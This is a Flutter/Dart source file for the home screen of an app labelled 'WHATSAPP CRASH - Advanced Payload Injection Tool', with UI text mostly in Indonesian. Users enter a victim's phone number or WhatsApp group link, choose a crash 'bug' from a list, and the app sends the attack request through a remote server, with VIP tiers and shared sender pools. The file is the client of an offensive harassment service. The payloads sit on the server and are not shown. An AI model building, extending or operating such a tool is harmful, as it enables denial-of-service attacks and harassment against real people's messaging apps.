//CRETEAD BY@ALEX SANDER NO ILANGIN CREDIT 
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  late VideoPlayerController _videoController;
  String selectedBugId = "";

  String _selectedBugMode = "number";
  String _senderMode = "private";
  int _globalSenderCount = 0;
  bool _isSending = false;

  // Warna oranye DarkVerse
  static const Color _gold = Color(0xFFFF8C00); // Accent orange
  static const Color _goldDark = Color(0xFFB86200); // Darker orange
  
  static const Color _bgDeep = Color(0xFF000000);
  static const Color _bgCard = Color(0xFF0A0A0A);
  static const Color _bgSection = Color(0xFF050505);
  static const Color _border = Color(0xFF1A1A0A);
  static const Color _textMuted = Color(0xFF6B6B6B);
  static const Color _textSubtle = Color(0xFF3D3D3D);

  @override
  void initState() {
    super.initState();

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController.setLooping(true);
        _videoController.setVolume(1.0);
        _videoController.play();
      }).catchError((e) {
        debugPrint("Video init error: $e");
      });

    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      final groups = widget.listBug.where((b) => (b['bug_id'] ?? '').toString().contains('_group')).toList();
      if (groups.isNotEmpty) return groups;
      return List<Map<String, dynamic>>.from(widget.listBug);
    } else {
      return widget.listBug.where((b) => !(b['bug_id'] ?? '').toString().contains('_group')).toList();
    }
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "https://private-server-production.up.railway.app/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _videoController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() { selectedBugId = currentBugs[0]['bug_id']; });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() { _isSending = true; });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip') ? _senderMode : 'private';

    try {
      final res = await http.get(Uri.parse(
          "https://private-server-production.up.railway.app/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("✅ Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() { _isSending = false; });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withValues(alpha: 0.8),
      builder: (_) => AlertDialog(
        backgroundColor: _bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _gold.withValues(alpha: 0.25)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(color: _gold.withValues(alpha: 0.12), borderRadius: BorderRadius.circular(10)),
              child: const Icon(Icons.info_outline, color: _gold, size: 20),
            ),
            const SizedBox(width: 12),
            Flexible(
              child: Text(title, style: const TextStyle(color: _gold, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 14)),
            ),
          ],
        ),
        content: Text(msg, style: const TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 13)),
        actions: [
          Container(
            decoration: BoxDecoration(color: _gold.withValues(alpha: 0.10), borderRadius: BorderRadius.circular(10), border: Border.all(color: _gold.withValues(alpha: 0.25))),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("OK", style: TextStyle(color: _gold, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 12)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _bgCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _gold.withValues(alpha: 0.25), width: 1.5),
        boxShadow: [
          BoxShadow(color: _gold.withValues(alpha: 0.08), blurRadius: 30, spreadRadius: 2),
        ],
        gradient: LinearGradient(colors: [_gold.withValues(alpha: 0.08), Colors.transparent], begin: Alignment.topLeft, end: Alignment.bottomRight),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _gold.withValues(alpha: 0.15),
              shape: BoxShape.circle,
              border: Border.all(color: _gold.withValues(alpha: 0.5)),
              boxShadow: [BoxShadow(color: _gold.withValues(alpha: 0.2), blurRadius: 15, spreadRadius: 1)],
            ),
            child: const Icon(Icons.bug_report_outlined, color: _gold, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text("WHATSAPP CRASH", style: TextStyle(color: _gold, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 18, letterSpacing: 2)),
                const SizedBox(height: 6),
                Text("Advanced Payload Injection Tool", style: TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 11, letterSpacing: 0.5)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(color: _gold.withValues(alpha: 0.10), borderRadius: BorderRadius.circular(20), border: Border.all(color: _gold.withValues(alpha: 0.3))),
            child: Text(widget.role.toUpperCase(), style: const TextStyle(color: _gold, fontSize: 10, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1)),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoBox() {
    return Container(
      height: 200,
      width: double.infinity,
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _gold.withValues(alpha: 0.15), width: 1),
        boxShadow: [
          BoxShadow(color: _gold.withValues(alpha: 0.05), blurRadius: 20, spreadRadius: 0),
        ],
      ),
      clipBehavior: Clip.antiAlias,
      child: _videoController.value.isInitialized
          ? SizedBox(
              width: double.infinity,
              height: double.infinity,
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          : const SizedBox(),
    );
  }

  Widget _buildModeSelector() {
    return Row(
      children: [
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "number";
                targetController.clear();
                final newBugs = _getFilteredBugs();
                if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "number" ? _gold.withValues(alpha: 0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "number" ? _gold.withValues(alpha: 0.6) : _border, width: _selectedBugMode == "number" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "number" ? [BoxShadow(color: _gold.withValues(alpha: 0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.phone_android_rounded, color: _selectedBugMode == "number" ? _gold : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("Bug Nomor", style: TextStyle(color: _selectedBugMode == "number" ? _gold : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "group";
                targetController.clear();
                final newBugs = _getFilteredBugs();
                if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "group" ? _gold.withValues(alpha: 0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "group" ? _gold.withValues(alpha: 0.6) : _border, width: _selectedBugMode == "group" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "group" ? [BoxShadow(color: _gold.withValues(alpha: 0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.groups_rounded, color: _selectedBugMode == "group" ? _gold : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("Bug Group", style: TextStyle(color: _selectedBugMode == "group" ? _gold : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSenderToggle() {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(color: _bgCard, borderRadius: BorderRadius.circular(18), border: Border.all(color: _gold.withValues(alpha: 0.15))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                width: 40,
                height: 40,
                decoration: BoxDecoration(color: _gold, borderRadius: BorderRadius.circular(12)),
                child: const Icon(Icons.sync_alt_rounded, color: Colors.black, size: 20),
              ),
              const SizedBox(width: 12),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("Sender Type", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
                    SizedBox(height: 2),
                    Text("Pilih sumber nomor pengirim", style: TextStyle(color: _textMuted, fontSize: 11)),
                  ],
                ),
              ),
              Icon(Icons.refresh_rounded, color: _textMuted, size: 20),
            ],
          ),
          const SizedBox(height: 18),
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'global'),
                  child: _buildSenderTypeOption(
                    selected: _senderMode == 'global',
                    icon: Icons.public_rounded,
                    title: "Global",
                    subtitle: "$_globalSenderCount sender aktif",
                    badge: "VIP+",
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'private'),
                  child: _buildSenderTypeOption(
                    selected: _senderMode == 'private',
                    icon: Icons.person_rounded,
                    title: "Private",
                    subtitle: "Session lu sendiri",
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildSenderTypeOption({
    required bool selected,
    required IconData icon,
    required String title,
    required String subtitle,
    String? badge,
  }) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 250),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: selected ? _gold.withValues(alpha: 0.08) : _bgSection,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: selected ? _gold.withValues(alpha: 0.6) : _border, width: selected ? 1.5 : 1),
      ),
      child: Stack(
        children: [
          if (selected)
            Positioned(
              top: 0,
              right: 0,
              child: Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(color: _gold, shape: BoxShape.circle, boxShadow: [BoxShadow(color: _gold.withValues(alpha: 0.6), blurRadius: 6, spreadRadius: 1)]),
              ),
            ),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Icon(icon, color: selected ? _gold : _textMuted, size: 22),
              const SizedBox(height: 10),
              Text(title, style: TextStyle(color: selected ? Colors.white : _textMuted, fontWeight: FontWeight.bold, fontSize: 14)),
              const SizedBox(height: 4),
              Text(subtitle, style: TextStyle(color: _textSubtle, fontSize: 10)),
              if (badge != null) ...[
                const SizedBox(height: 8),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(color: const Color(0xFF2196F3).withValues(alpha: 0.15), borderRadius: BorderRadius.circular(6), border: Border.all(color: const Color(0xFF2196F3).withValues(alpha: 0.4))),
                  child: const Text("VIP+", style: TextStyle(color: Color(0xFF2196F3), fontSize: 9, fontWeight: FontWeight.bold)),
                ),
              ],
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();

    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(color: _bgCard, borderRadius: BorderRadius.circular(20), border: Border.all(color: _gold.withValues(alpha: 0.10))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildModeSelector(),
          const SizedBox(height: 24),
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              _selectedBugMode == "number" ? "NOMOR TARGET" : "LINK GROUP WHATSAPP",
              style: const TextStyle(color: _gold, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5),
            ),
          ),
          TextField(
            controller: targetController,
            style: const TextStyle(color: Colors.white, fontSize: 15),
            cursorColor: _gold,
            keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
            decoration: InputDecoration(
              hintText: _selectedBugMode == "number" ? "Contoh: +62812xxxxxxxx" : "Contoh: https://chat.whatsapp.com/...",
              hintStyle: const TextStyle(color: _textSubtle, fontSize: 13),
              filled: true,
              fillColor: _bgSection,
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _border)),
              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _border)),
              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _gold.withValues(alpha: 0.5), width: 1.5)),
              prefixIcon: Icon(_selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link, color: _gold.withValues(alpha: 0.5)),
              contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 20),
            ),
          ),
          const SizedBox(height: 22),
          if (availableBugs.isNotEmpty) ...[
            const Padding(
              padding: EdgeInsets.only(left: 4, bottom: 8),
              child: Text("PILIH BUG", style: TextStyle(color: _gold, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5)),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 4),
              decoration: BoxDecoration(color: _bgSection, borderRadius: BorderRadius.circular(14), border: Border.all(color: _border)),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: _bgSection,
                  value: selectedBugId.isNotEmpty ? selectedBugId : null,
                  isExpanded: true,
                  icon: Icon(Icons.arrow_drop_down, color: _gold.withValues(alpha: 0.5)),
                  iconSize: 28,
                  style: const TextStyle(color: Colors.white, fontSize: 14, fontFamily: 'ShareTechMono'),
                  items: availableBugs.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Row(
                        children: [
                          Container(
                            width: 7,
                            height: 7,
                            margin: const EdgeInsets.only(right: 10),
                            decoration: BoxDecoration(color: _gold, shape: BoxShape.circle),
                          ),
                          Text(bug['bug_name'], style: const TextStyle(color: Colors.white)),
                        ],
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() { selectedBugId = value ?? ""; });
                  },
                ),
              ),
            ),
          ] else ...[
            const Center(child: Padding(padding: EdgeInsets.all(16.0), child: Text("No payload available for this mode.", style: TextStyle(color: _textMuted)))),
          ],
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          height: 58,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            gradient: const LinearGradient(colors: [_gold, _goldDark], begin: Alignment.topLeft, end: Alignment.bottomRight),
            boxShadow: [
              BoxShadow(color: _gold.withValues(alpha: 0.35), blurRadius: 25, spreadRadius: 2, offset: const Offset(0, 8)),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)), elevation: 0, shadowColor: Colors.transparent),
            child: _isSending
                ? const SizedBox(height: 24, width: 24, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2.5))
                : const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.rocket_launch_rounded, color: Colors.white, size: 20),
                      SizedBox(width: 12),
                      Text("KIRIM BUG ATTACK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 15, letterSpacing: 1.5, fontFamily: 'Orbitron')),
                    ],
                  ),
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDeep,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildTopHeader(),
              const SizedBox(height: 14),
              _buildVideoBox(),
              const SizedBox(height: 20),
              _buildInputPanel(),
              const SizedBox(height: 16),
              _buildSenderToggle(),
              const SizedBox(height: 16),
              _buildSendButton(),
              const SizedBox(height: 40),
              Center(
                child: Text("Session: ${widget.expiredDate}", style: TextStyle(color: _textSubtle, fontSize: 10, fontFamily: 'ShareTechMono')),
              ),
              const SizedBox(height: 16),
            ],
          ),
        ),
      ),
    );
  }
}
